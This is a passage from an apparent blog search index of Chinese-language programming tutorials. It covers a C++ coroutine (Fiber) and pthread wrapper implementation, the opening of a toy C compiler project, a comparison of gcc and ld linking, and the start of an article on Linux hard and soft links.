\u0026lt;\u0026lt; \u0026#34; : gonna free m_stack unexcpected\u0026#34; \u0026lt;\u0026lt; std::endl; exit(0); } } else// 如果没有运行栈就简单进行善后，正常不应该运行以下代码  { assert(!m_cb); assert(m_state == EXEC); Fiber* cur = t_fiber; if(cur == this) SetThis(nullptr); } std::cout \u0026lt;\u0026lt; \u0026#34;Fiber::~Fiber id = \u0026#34; \u0026lt;\u0026lt; m_id \u0026lt;\u0026lt; \u0026#34;,total = \u0026#34; \u0026lt;\u0026lt; s_fiber_count \u0026lt;\u0026lt; std::endl; }   reset 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  void Fiber::reset(std::function\u0026lt;void()\u0026gt; cb) { assert(m_stack); // 当协程处于以下状态的时候可以尝试 reset 其执行函数  if(m_state == INIT || m_state == TERM || m_state == EXCEPT) { m_cb = cb;// 更新执行函数  if(getcontext(\u0026amp;m_ctx))// 尝试更新上下文  std::cout \u0026lt;\u0026lt; __FILE__ \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; __func__ \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; : getcontext() failed\u0026#34; \u0026lt;\u0026lt; std::endl; // 设置好上下文  m_ctx.uc_link = nullptr; m_ctx.uc_stack.ss_sp = m_stack; m_ctx.uc_stack.ss_size = m_stacksize; makecontext(\u0026amp;m_ctx,\u0026amp;Fiber::MainFunc,0);// 将上下文设置为 MainFunc 函数  m_state = INIT;// 重置协程状态  } else// 正常不应该运行到这些代码  { std::cout \u0026lt;\u0026lt; __FILE__ \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; __func__ \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; : gonna reset function unexcpected\u0026#34; \u0026lt;\u0026lt; std::endl; exit(0); } }   call 1 2 3 4 5 6 7 8 9 10 11 12 13  // call() 函数是不需要调度器的切换函数 void Fiber::call() { SetThis(this);// 设置当前运行协程  m_state = EXEC; if(t_threadFiber == nullptr)// 如果当前线程主协程为空就退出  { std::cout \u0026lt;\u0026lt; \u0026#34;nullptr\u0026#34; \u0026lt;\u0026lt; std::endl; exit(0); } if(swapcontext(\u0026amp;t_threadFiber-\u0026gt;m_ctx, \u0026amp;m_ctx))// 和线程主协程切换  std::cout \u0026lt;\u0026lt; __FILE__ \u0026lt;\u0026lt; __func__ \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; : swapcontext() failed\u0026#34; \u0026lt;\u0026lt; std::endl; }   SetThis 1 2 3 4  void Fiber::SetThis(Fiber* f) { t_fiber = f;// 设置当前协程 }   back 1 2 3 4 5 6 7  // back() 函数是不需要调度器的切换函数 void Fiber::back() { SetThis(t_threadFiber.get());// 设置主协程为运行协程  if(swapcontext(\u0026amp;m_ctx,\u0026amp;t_threadFiber-\u0026gt;m_ctx))// 和主协程切换  std::cout \u0026lt;\u0026lt; __FILE__ \u0026lt;\u0026lt; __func__ \u0026lt;\u0026lt; __LINE__ \u0026lt;\u0026lt; \u0026#34; : swapcontext() failed\u0026#34; \u0026lt;\u0026lt; std::endl; }   swapIn 1 2 3 4 5 6 7 8 9 10  // 需要调度器的切换函数 void Fiber::swapIn() { SetThis(this);// 设置运行协程  assert(m_state != EXEC); m_state = EXEC; if(swapcontext(\u0026amp;Scheduler::GetMainFiber()-\u0026gt;m_ctx,\u0026amp;m_ctx))// 和调度器主协程切换  std::cout \u0026lt;\u0026lt; \u0026#34;swapcontext failed\u0026#34; \u0026lt;\u0026lt; std::endl; }   swapOut 1 2 3 4 5 6 7 8  // 需要调度器的切换函数 void Fiber::swapOut() { SetThis(Scheduler::GetMainFiber());// 设置调度器主协程为运行协程  if(swapcontext(\u0026amp;m_ctx,\u0026amp;Scheduler::GetMainFiber()-\u0026gt;m_ctx))// 和调度器主协程切换  std::cout \u0026lt;\u0026lt; \u0026#34;swapcontext failed\u0026#34; \u0026lt;\u0026lt; std::endl; }   GetThis 1 2 3 4 5 6 7 8 9 10  Fiber::ptr Fiber::GetThis() { if(t_fiber)// 如果有运行协程，就获取该协程  return t_fiber-\u0026gt;shared_from_this(); // 如果没有运行协程，即第一次运行的时候  Fiber::ptr main_fiber = std::make_shared\u0026lt;Fiber\u0026gt;();// 这里使用无参构造函数创建了一个主协程  assert(t_fiber == main_fiber.get());// 确认成功将主协程设置为运行协程  t_threadFiber = main_fiber;// 设置该主协程为线程主协程  return t_fiber-\u0026gt;shared_from_this(); }   TotalFibers 1 2 3 4  uint64_t Fiber::TotalFibers() { return s_fiber_count;// 返回协程总量 }   MainFunc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  void Fiber::MainFunc() { Fiber::ptr cur = GetThis(); assert(cur); try { cur-\u0026gt;m_cb();// 这里是真正运行协程的函数的地方  cur-\u0026gt;m_cb = nullptr;// 运行后将其设置为空，如果想多次调用需要在业务逻辑中写，当然如果你想的话也可以稍微改一改，比如在构造函数加个参数用于控制该任务是否循环执行之类的  cur-\u0026gt;m_state = TERM; } catch(std::exception\u0026amp; ex)// 如果有异常  { cur-\u0026gt;m_state = EXCEPT; std::cout \u0026lt;\u0026lt; \u0026#34;Fiber Except : \u0026#34; \u0026lt;\u0026lt; ex.what() \u0026lt;\u0026lt; \u0026#34; Fiber id = \u0026#34; \u0026lt;\u0026lt; cur-\u0026gt;getId() \u0026lt;\u0026lt; std::endl; } catch(...)// 如果有异常  { cur-\u0026gt;m_state = EXCEPT; std::cout \u0026lt;\u0026lt; \u0026#34;Fiber Except : \u0026#34; \u0026lt;\u0026lt; \u0026#34;Unknown Error \u0026#34; \u0026lt;\u0026lt; \u0026#34; Fiber id = \u0026#34; \u0026lt;\u0026lt; cur-\u0026gt;getId() \u0026lt;\u0026lt; std::endl; } auto raw_ptr = cur.get();// 这里获取运行协程的裸指针，这里这样做是防止引用计数有剩余不归零  cur.reset();// 对该智能指针 reset  raw_ptr-\u0026gt;swapOut();// 利用裸指针切出去 }   CallerMainFunc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  // 同上 void Fiber::CallerMainFunc() { Fiber::ptr cur = GetThis(); assert(cur); try { cur-\u0026gt;m_cb(); cur-\u0026gt;m_cb = nullptr; cur-\u0026gt;m_state = TERM; } catch (std::exception\u0026amp; ex) { cur-\u0026gt;m_state = EXCEPT; std::cout \u0026lt;\u0026lt; \u0026#34;Fiber Except: \u0026#34; \u0026lt;\u0026lt; ex.what() \u0026lt;\u0026lt; \u0026#34; fiber_id=\u0026#34; \u0026lt;\u0026lt; cur-\u0026gt;getId() \u0026lt;\u0026lt; std::endl; } catch (...) { cur-\u0026gt;m_state = EXCEPT; std::cout \u0026lt;\u0026lt; \u0026#34;Fiber Except\u0026#34; \u0026lt;\u0026lt; \u0026#34; fiber_id=\u0026#34; \u0026lt;\u0026lt; cur-\u0026gt;getId() \u0026lt;\u0026lt; std::endl; } auto raw_ptr = cur.get(); cur.reset(); raw_ptr-\u0026gt;back();// 这里换成 back }   无调度器版本 无调度器版本其实就是将所有涉及到调度器的代码全删除，swapIn()，swapOut()，MainFunc()可以全都删除，用的时候只用 call() 和 back() 就行。\n测试 测试用例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  #include \u0026#34;thread.h\u0026#34;#include \u0026#34;fiber.h\u0026#34;#include \u0026lt;iostream\u0026gt;#include \u0026lt;vector\u0026gt;#include \u0026lt;memory\u0026gt;#include \u0026lt;string\u0026gt; void func1() { std::cout \u0026lt;\u0026lt; \u0026#34;running\u0026#34; \u0026lt;\u0026lt; std::endl; } int test() { std::cout \u0026lt;\u0026lt; std::endl; coloda::Fiber::GetThis(); coloda::Fiber::ptr f = std::make_shared\u0026lt;coloda::Fiber\u0026gt;(func1,1024); f-\u0026gt;call(); f-\u0026gt;reset(func1); f-\u0026gt;call(); f-\u0026gt;reset(func1); f-\u0026gt;call(); f-\u0026gt;reset(func1); f-\u0026gt;call(); std::cout \u0026lt;\u0026lt; coloda::Thread::getCur_name() \u0026lt;\u0026lt; std::endl; return 0; } int main() { std::string name = \u0026#34;main\u0026#34;; std::vector\u0026lt;coloda::Thread::ptr\u0026gt; v; for(int i = 0;i \u0026lt; 3;++i) { coloda::Thread::ptr tmp = std::make_shared\u0026lt;coloda::Thread\u0026gt;(\u0026amp;test,\u0026#34;test\u0026#34;+std::to_string(i)); v.push_back(tmp); } coloda::Thread::setCur_name(name); for(auto i : v) i-\u0026gt;join(); return 0; } // 该测试程序就是创建三个线程，这三个线程都执行 test() 函数，每个线程都创建一个工作协程和一个线程主协程，该协程会运行四次 func1()。   测试结果 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  main Fiber::Fiber main Fiber::Fiber id = 1 running running running running test2 Fiber::~Fiber id = 1,total = 1 Fiber::~Fiber id = 0,total = 0 Fiber::Fiber main Fiber::Fiber id = 2 running running running running test1 Fiber::~Fiber id = 2,total = 1 Fiber::~Fiber id = 0,total = 0 Fiber::Fiber main Fiber::Fiber id = 3 running running running running test0 Fiber::~Fiber id = 3,total = 1 Fiber::~Fiber id = 0,total = 0   总结 网上的协程轮子有很多，有的很简单，有的很复杂，我觉得这个还算是中规中矩的一个，比较好分析和理解。不过只有协程没有调度器的话使用起来还是很麻烦，后续我会发布调度器的文章。\n","date":"2022-06-04T00:00:00Z","permalink":"https://lunaasuka.github.io/p/%E7%AE%80%E5%8D%95%E8%BD%AE%E5%AD%90%E7%B3%BB%E5%88%97-%E5%8D%8F%E7%A8%8B/","title":"简单轮子系列-协程"},{"content":"前言 先简单开个坑，分享一下我自己用过的轮子。\n话说在最前头，我对文中所用到的技术的理解并没有那么深，如果有任何写错的地方烦请不吝赐教。\n作为系列的开端，先写一个最简单的线程，我们采用的是 pthread ，简单对其封装一下。\n目标是写一个能方便使用的协程，线程作为最基础的一环，我们就先来处理它，我会保证每篇文章里的代码你拿去测试都是可以正常运行的，同时我会做尽量详细的注释以确保绝大多数人都看得懂。当然看懂只是一个前提，有能力的同学还是多利用 GDB 去调试测试用例吧。\n声明 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73  // thread.h  #ifndef __COLODA_THREAD_H__ #define __COLODA_THREAD_H__  #include \u0026#34;noncopyable.h\u0026#34;\t//后面会补上#include \u0026lt;memory\u0026gt;#include \u0026lt;pthread.h\u0026gt;#include \u0026lt;semaphore.h\u0026gt;#include \u0026lt;functional\u0026gt;#include \u0026lt;string\u0026gt;#include \u0026lt;syscall.h\u0026gt; namespace coloda\t//使用了一个独立的命名空间 { class Thread : public Noncopyable\t//继承自 Noncopyable ，代表 Thread 是不可拷贝的 { public: typedef std::shared_ptr\u0026lt;Thread\u0026gt; ptr; /** * @brief: 构造函数 * @param[in]: cb，目标函数，即线程要执行的函数 * @param[in]: name，线程名称 */ Thread(std::function\u0026lt;void()\u0026gt; cb,const std::string\u0026amp; name);\t/* * @brief: 析构函数 */ ~Thread(); /* * @brief: 获取线程名称 */ const std::string\u0026amp; getName() {return m_name;} /* * @brief: 等待回收线程 */ void join(); /* * @brief: 获取当前运行的线程指针 */ static Thread* getCur_thread(); /* * @brief: 获取当前运行的线程名称 */ static const std::string\u0026amp; getCur_name(); /* * @brief: 为当前运行的线程设置名称 * @param[in]: name，线程名称 */ static void setCur_name(std::string\u0026amp; name); private: /* * @brief: 线程执行函数 */ static void* run(void* args); private: pthread_t m_thread = 0;\t// 在这里我们简单的认为它是一个 unsigned long int，但是它在不同平台下的定义是不同的，想深入了解的请自行查询  std::string m_name;\t// 线程名称  std::function\u0026lt;void()\u0026gt; m_cb;\t// 目标执行函数  sem_t m_sem;\t// 信号量 }; } #endif   定义 构造函数 我会将部分代码单独拿出来说，下面这些代码块都是顺序相连的，如果你想 copy 这些代码请顺序 copy，主要是要注意 namespace 的右括号不要忘了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  #include \u0026#34;thread.h\u0026#34;#include \u0026lt;iostream\u0026gt;#include \u0026lt;sys/types.h\u0026gt;namespace coloda { // 使用 thread_local 修饰的变量仅在所属线程内部可见 static thread_local Thread* t_thread = nullptr;\t// 用于表示当前线程 static thread_local std::string t_thread_name = \u0026#34;UNKNOW\u0026#34;;\t// 表示当前线程名称  Thread::Thread(std::function\u0026lt;void()\u0026gt; cb,const std::string\u0026amp; name) :m_name(name) ,m_cb(cb) { if(name.empty())\t// 如果 name 为空则使用默认名 \u0026#34;UNKNOWN\u0026#34;  m_name = \u0026#34;UNKNOWN\u0026#34;; int rt = pthread_create(\u0026amp;m_thread, nullptr, \u0026amp;Thread::run, this);\t// 创建线程，这里要注意的是 m_thread，这个属性的默认值我们设置为0，如果该函数成功运行之后这个值会变成一个随机值  if(rt)// 如果创建失败直接退出  { std::cout \u0026lt;\u0026lt; \u0026#34;pthread_create failed\u0026#34; \u0026lt;\u0026lt; std::endl; exit(-1); } sem_init(\u0026amp;m_sem,0,0);\t// 初始化信号量  sem_wait(\u0026amp;m_sem);\t// wait 信号量，使信号量减1，具体用途后面再说 }   析构函数 1 2 3 4 5  Thread::~Thread() { if(m_thread)\t// 如果没有主动 join 线程的话会触发析构函数，这时 m_thread 不应该为0  pthread_detach(m_thread);\t// detach 该线程，让操作系统回收它 }   join() 1 2 3 4 5 6 7 8 9 10 11 12 13  void Thread::join() { if(m_thread)\t//这时 m_thread 不应为 0  { int rt = pthread_join(m_thread,nullptr);\t// join 该线程  if(rt)\t// 如果 join 失败  { std::cout \u0026lt;\u0026lt; \u0026#34;pthread_join failed\u0026#34; \u0026lt;\u0026lt; std::endl; exit(-1); } m_thread = 0; } }   getCur_thread() 1 2 3 4  Thread* Thread::getCur_thread() { return t_thread; }   getCur_name() 1 2 3 4  const std::string\u0026amp; Thread::getCur_name() { return t_thread_name; }   setCur_name() 1 2 3 4 5 6  void Thread::setCur_name(std::string\u0026amp; name) { if(t_thread) t_thread-\u0026gt;m_name = name; t_thread_name = name; }   run() 1 2 3 4 5 6 7 8 9 10 11 12 13  void* Thread::run(void* arg) { Thread* thread = (Thread*)arg;\t// 在当前线程下产生一个新线程  t_thread = thread;\t// 让该线程等于 t_thread  t_thread_name = thread-\u0026gt;m_name; pthread_setname_np(pthread_self(),thread-\u0026gt;m_name.substr(0,15).c_str());\t// 设置名字  std::function\u0026lt;void()\u0026gt; cb;\t// 新建 cb  cb.swap(thread-\u0026gt;m_cb);\t// 将线程的 cb 给这个新的 cb  sem_post(thread-\u0026gt;m_sem);\t// 这里 post ,使信号量加1  cb();\t// 运行目标函数  return 0; } }\t// namespace 的括号   这里重点说一下信号量，我们在构造函数中上 wait，在 run() 中 post ，是为了确保能够在线程创建之后才退出构造函数。我们可以看到是在构造函数中使用了 pthread_create() ，为了防止由于线程调度所产生的顺序不确定性导致的在构造函数退出之后 pthread_create() 还没结束甚至还没开始这种情况，我们使用了信号量来确保顺序的正确。但是这种情况应该很少见，其实不加这个信号量也基本上没啥问题。\n测试 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  #include \u0026lt;iostream\u0026gt;#include \u0026lt;vector\u0026gt;#include \u0026#34;thread.h\u0026#34;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;string\u0026gt; void func() { while(1) { std::cout \u0026lt;\u0026lt; coloda::Thread::getCur_name() \u0026lt;\u0026lt; std::endl; sleep(1); } } int main() { std::vector\u0026lt;coloda::Thread::ptr\u0026gt; v; for(int i = 0;i \u0026lt; 5;++i) { coloda::Thread::ptr tmp = std::make_shared\u0026lt;coloda::Thread\u0026gt;(func,\u0026#34;test\u0026#34;+std::to_string(i)); v.emplace_back(tmp); } for(int i = 0;i \u0026lt; 5;++i) v[i]-\u0026gt;join(); return 0; }   在测试用例中我们使用 vector 来管理了 4 个线程对象，他们需要执行的任务就是简单的打印当前正在运行的线程名称。\n如果测试用例运行正常就说明线程整体没啥问题，可以正常工作。\n","date":"2022-05-24T00:00:00Z","permalink":"https://lunaasuka.github.io/p/%E7%AE%80%E5%8D%95%E8%BD%AE%E5%AD%90%E7%B3%BB%E5%88%97-%E7%BA%BF%E7%A8%8B/","title":"简单轮子系列-线程"},{"content":"编译器，大多数人理解的是可以将某种语言的源代码文件转换成一个可执行文件的程序，日常来说确实如此，但是严格来讲编译器只是负责将一种语言翻译成另外一个语言，例如将 c 翻译成汇编。\n而该项目所说的编译器其实是一个 c 语言解释器，我们要做的工作是先将 c 语言翻译成我们自己设计的一种伪汇编，然后在一个我们自己模拟的虚拟机环境下直接解释运行伪汇编。不过就算这样我们一样做了“编译”这个工作对吧。\n这样做的理由如下：\n1.我还没系统的学过汇编，让我直接把 c 翻译成汇编是不可能的事。\n2.这种设计能够大大简化我们所需的工作，并且依然能够得到令人满意的结果。\n先写个 main 函数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;memory.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdint.h\u0026gt; int token;//当前的标识符 char* src;//源文件，即我们要编译的文件 int memorySize; int line;//行号，Debug用的 int debug;//调试模式  void next() { token = *src++; //do something  return ; } void expression(int level) { //do something } void parse() { next(); while(token \u0026gt; 0) { //do something  } } int VM() { //do something  return 0; } int main(int argc,char** argv) { int tmp;//标识一些函数返回状态的临时变量  int fd;//文件描述符  argc--;//main函数的参数中第一个是main自己，需要去掉这个，所以数量-1  argv++;//参数向后推一个，去掉main  memorySize = 512 * 1024;//为各个段分配的内存大小,521KB  line = 1; if (argc \u0026gt; 0 \u0026amp;\u0026amp; (*argv)[0] == \u0026#39;-\u0026#39; \u0026amp;\u0026amp; (*argv)[1] == \u0026#39;d\u0026#39;) {//开启Debug模式  debug = 1; argc--; argv++; } if (argc \u0026lt; 1) {//参数过少  printf(\u0026#34;usage: ./718Compiler [-d] xxx.c\\n\u0026#34;); return -1; } if((fd = open(*argv,0)) \u0026lt; 0) {//打开源文件  printf(\u0026#34;could not open(%s)\\n\u0026#34;,*argv); return -1; } if(!(src = (char*)malloc(memorySize))) {//给src分配空间  printf(\u0026#34;could not malloc(%d) for source area\\n\u0026#34;,memorySize); } if((tmp = read(fd,src,memorySize - 1)) \u0026lt;= 0) {//把源文件读入到src中  printf(\u0026#34;read source file failed\\n\u0026#34;); return -1; } src[tmp] = 0;//向src末尾添加\u0026#39;\\0\u0026#39;作为EOF标志  close(fd); parse(); return VM(); }   我会尽可能详细的做全注释，以确保初学者也能轻松的看懂。\n我们可以看到代码中有几个尚未实现的函数，这些函数我们会在后续的文章中逐步扩充，现在不需要去关注它们，专注于目前的代码就好。\nOK，以上就是本节的内容，实际上也没什么东西，大体表示出了整个编译器的框架，接下来我们会逐步填充这个不完整的程序，最终构建起我们的编译器。\nps：注意我们的代码都是运行在32位环境下，64位编译环境下可能会发生一些未知的错误，所以我推荐你在用 gcc 编译的时候加上 ‘-m32’ 选项。\n","date":"2022-05-11T00:00:00Z","permalink":"https://lunaasuka.github.io/p/%E4%BB%8E%E9%9B%B6%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AAc%E8%AF%AD%E8%A8%80%E7%BC%96%E8%AF%91%E5%99%A81/","title":"从零构建一个c语言编译器(1)"},{"content":"前言 为什么要写编译器？我不知道，只是单纯的觉得这玩意很有意思，我对底层的软件都很感兴趣，编译器只是其中一环，可能我只是闲的，或者因为别的什么不可预知的东西，总之这个项目就开始了。\n我需要了解什么知识 写到这的时候其实我连编译原理还没学完。如果你想开始这个项目，只需要一点 c 语言基础外加一点兴趣即可。\n关于该项目的难度 有一定难度，如果你是第一次接触代码量比较大的项目的话可能有些吃力，但是其实整个编译器的代码量也就一千多行。\n学习完这个项目能收获什么 我从未研究过主流编译器的源码，所以想通过这个小项目就想完全掌握编译器是不可能的，我之前打算看看 gcc 早期版本的源码来着，但是说实话，挺复杂的，而且没什么资料可以用来辅助，于是我打算还是先从一个尽可能简单的编译器开始吧。综上所述，我觉得可能收获不大，说实话这完全是一个兴趣驱动的项目，你可能会花费大把时间在调试上。\n我的学习历程 到目前为止，我学习一个新东西总是要依赖一些入门项目，就编译器而言，我参考了好几个项目，只能说是大同小异吧，如果你想独立研究的话可以去github上找找，比较著名的编译器是 c4 ，只用了4个函数就完成了一个简单的编译器，可以自举，并且代码量只有500多行。c4 的问题是不易与学习和理解，为了减少代码量作者用了很多技巧，这对于一个初学者无疑是灾难性的，c4 的学习成本有点太高了，所以后来我找了好几个基于 c4 写的编译器用于研究，如果你真的对编译器感兴趣的话我也推荐你这样做。\n一些建议 1.多用 gdb ，硬看代码是不可能看懂的，我在学习别人的编译器时90%以上的时间都在 gdb 中度过，如果你从未接触过 gdb 也不要紧，最多一天你就会上手这个强大的工具。ps：初学者推荐使用 gdbtui ，它也是 gdb ，不过可以在屏幕上方同步显示出源文件代码，非常的方便。\n2.如果你感到不适，请停止工作去干的别的什么，闷头一直研究这个东西只会让你越陷越深。\n最后，不要想着通过这个项目来学习编译原理，如果你想在编译器领域更加深入的话我建议你好好学习编译原理而不是折腾一个简陋的小编译器。\n由于本人水平一般，经验不足，文章和代码难免会有错误，如果有任何疑问和建议可以通过我的联系方式联系到我，欢迎批评指正。\n","date":"2022-05-10T00:00:00Z","permalink":"https://lunaasuka.github.io/p/%E4%BB%8E%E9%9B%B6%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AAc%E8%AF%AD%E8%A8%80%E7%BC%96%E8%AF%91%E5%99%A80/","title":"从零构建一个c语言编译器(0)"},{"content":"前言：最近在学习从零写一个操作系统，有时间的话我会考虑写个完整的过程发上来。\n一 ​\t众所周知，一个c语言程序从写完到变成可执行文件要经历四个步骤，分别是预编译，编译，汇编和链接。本文的重点是讨论链接时的特性。我们先来看一段c语言代码。\n1 2 3 4 5  int main(void) { while(1); return 0; }   这是一段最简单的c语言代码，它十分的简洁，甚至连任何标准库都没有。\n二\t使用gcc编译 ​\t我们尝试使用gcc进行编译这个文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  asuka@ubuntu:~/bochs/bin/kernel$ cat main.c int main(void) { while(1); return 0; } asuka@ubuntu:~/bochs/bin/kernel$ gcc -o test.bin main.c asuka@ubuntu:~/bochs/bin/kernel$ ll test.bin -rwxrwxr-x 1 asuka asuka 7312 Jan 17 18:20 test.bin* asuka@ubuntu:~/bochs/bin/kernel$ nm test.bin 0804a018 B __bss_start 0804a018 b completed.7209 0804a010 D __data_start 0804a010 W data_start 08048320 t deregister_tm_clones 08048390 t __do_global_dtors_aux 08049f0c t __do_global_dtors_aux_fini_array_entry 0804a014 D __dso_handle 08049f14 d _DYNAMIC 0804a018 D _edata 0804a01c B _end 08048444 T _fini 08048458 R _fp_hw 080483b0 t frame_dummy 08049f08 t __frame_dummy_init_array_entry 08048544 r __FRAME_END__ 0804a000 d _GLOBAL_OFFSET_TABLE_ w __gmon_start__ 08048460 r __GNU_EH_FRAME_HDR 0804828c T _init 08049f0c t __init_array_end 08049f08 t __init_array_start 0804845c R _IO_stdin_used w _ITM_deregisterTMCloneTable w _ITM_registerTMCloneTable 08049f10 d __JCR_END__ 08049f10 d __JCR_LIST__ w _Jv_RegisterClasses 08048440 T __libc_csu_fini 080483e0 T __libc_csu_init U __libc_start_main@@GLIBC_2.0 080483db T main 08048350 t register_tm_clones 080482e0 T _start 0804a018 D __TMC_END__ 08048310 T __x86.get_pc_thunk.bx   ​\t通过上面的命令我们可以看出，我们使用gcc编译之后的文件 test.bin 大小为7312k，同时我们使用 nm 命令可以看到test.bin文件中有相当多的符号。\n三\t使用 ld 命令链接 ​\tLinux 中有个之类叫 ld ，可以用来手动把这些文件链接起来。\n1 2 3 4 5 6 7 8 9 10 11  asuka@ubuntu:~/bochs/bin/kernel$ gcc -c -o main.o main.c asuka@ubuntu:~/bochs/bin/kernel$ file main.o main.o: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped asuka@ubuntu:~/bochs/bin/kernel$ ld main.o -Ttext 0xc0001500 -e main -o kernel.bin asuka@ubuntu:~/bochs/bin/kernel$ ll kernel.bin -rwxrwxr-x 1 asuka asuka 1912 Jan 17 18:41 kernel.bin* asuka@ubuntu:~/bochs/bin/kernel$ nm kernel.bin c000253c R __bss_start c000253c R _edata c000253c R _end c0001500 T main   ​\t这次简洁不少，我们首先使用 gcc -c 这个参数把 main.c 编译到汇编那一步，现在只差链接，然后我们可以用 file 看到此时的 main.o 是 relocatable ，是可重定位文件，因为还没有链接，之后我们使用 ld 命令把他链接，-Ttext 命令用于指定起始虚拟地址，这里可以我是为了能在我的操作系统中使用才加的这个参数，可以忽略， -e 是为了指定以 main 为起始点，否则默认是 _start ，链接好后我们可以看到 kernel.bin 的大小只有1912k，其中的符号也只有4条。\n四\t比较 ​\t其实两者从功能上来说是完全一样的，test.bin 之所以这么大是因为编译器在编译过程中为程序自动引用了别的代码，这是c运行库的功劳，目的是在调用 main 之前做初始化工作，可以看到里面有 _start ，实际上程序是从这里开始的，之后才调用了 main 函数。而我们手动链接既没有链接其他标准库，又指定了从 main 起始，所以小了很多。\n五\t总结 ​\t实际上来说区别不大，该用 gcc 还是要用 gcc 的，这个例子就是演示了下编译器为我们额外做的工作而已。\n","date":"2022-01-18T00:00:00Z","permalink":"https://lunaasuka.github.io/p/linux%E4%B8%8B%E4%B8%A4%E7%A7%8D%E9%93%BE%E6%8E%A5%E6%96%B9%E5%BC%8F%E7%9A%84%E4%B8%8D%E5%90%8C/","title":"Linux下两种链接方式的不同"},{"content":"学习如何使用链接，通过从 Linux 文件系统多个位置来访问文件，可以让日常工作变得轻松。\n​\tLinux 文件系统中有两种链接link：硬链接hard link和软链接soft link。虽然二者差别显著，但都用来解决相似的问题。它们都提供了对单个文件的多个目录项（引用）的访问，但实现却大为不同。链接的强大功能赋予了 Linux 文件系统灵活性，因为一切皆是文件。\n​\t举个例子，我曾发现一些程序要求特定的版本库方可运行。 当用升级后的库替代旧库后，程序会崩溃，提示旧版本库缺失。通常，库名的唯一变化就是版本号。出于直觉，我仅仅给程序添加了一个新的库链接，并以旧库名称命名。我试着再次启动程序，运行良好。程序就是一个游戏，人人都明白，每个玩家都会尽力使游戏进行下去。\n​\t事实上，几乎所有的应用程序链接库都使用通用的命名规则，链接名称中包含了主版本号，链接所指向的文件的文件名中同样包含了小版本号。再比如，程序的一些必需文件为了迎合 Linux 文件系统规范，从一个目录移动到另一个目录中，系统为了向后兼容那些不能获取这些文件新位置的程序在旧的目录中存放了这些文件的链接。如果你对 /lib64 目录做一个长清单列表，你会发现很多这样的例子。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  lrwxrwxrwx. 1 root root 36 Dec 8 2016 cracklib_dict.hwm -\u0026gt; ../../usr/share/cracklib/pw_dict.hwm lrwxrwxrwx. 1 root root 36 Dec 8 2016 cracklib_dict.pwd -\u0026gt; ../../usr/share/cracklib/pw_dict.pwd lrwxrwxrwx. 1 root root 36 Dec 8 2016 cracklib_dict.pwi -\u0026gt; ../../usr/share/cracklib/pw_dict.pwi lrwxrwxrwx. 1 root root 27 Jun 9 2016 libaccountsservice.so.0 -\u0026gt; libaccountsservice.so.0.0.0 -rwxr-xr-x. 1 root root 288456 Jun 9 2016 libaccountsservice.so.0.0.0 lrwxrwxrwx 1 root root 15 May 17 11:47 libacl.so.1 -\u0026gt; libacl.so.1.1.0 -rwxr-xr-x 1 root root 36472 May 17 11:47 libacl.so.1.1.0 lrwxrwxrwx. 1 root root 15 Feb 4 2016 libaio.so.1 -\u0026gt; libaio.so.1.0.1 -rwxr-xr-x. 1 root root 6224 Feb 4 2016 libaio.so.1.0.0 -rwxr-xr-x. 1 root root 6224 Feb 4 2016 libaio.so.1.0.1 lrwxrwxrwx. 1 root root 30 Jan 16 16:39 libakonadi-calendar.so.4 -\u0026gt; libakonadi-calendar.so.4.14.26 -rwxr-xr-x. 1 root root 816160 Jan 16 16:39 libakonadi-calendar.so.4.14.26 lrwxrwxrwx. 1 root root 29 Jan 16 16:39 libakonadi-contact.so.4 -\u0026gt; libakonadi-contact.so.4.14.26   /lib64 目录下的一些链接\n在上面展示的 /lib64 目录清单列表中，文件模式第一个字母 l （小写字母 l）表示这是一个软链接（又称符号链接）。\n硬链接 ​\t在 Linux 的 EXT4 文件系统的历史、特性以及最佳实践一文中，我曾探讨过这样一个事实，每个文件都有一个包含该文件信息的 inode，包含了该文件的位置信息。上述文章中的图2展示了一个指向 inode 的单一目录项。每个文件都至少有一个目录项指向描述该文件信息的 inode ，目录项是一个硬链接，因此每个文件至少都有一个硬链接。\n​\t如下图 1 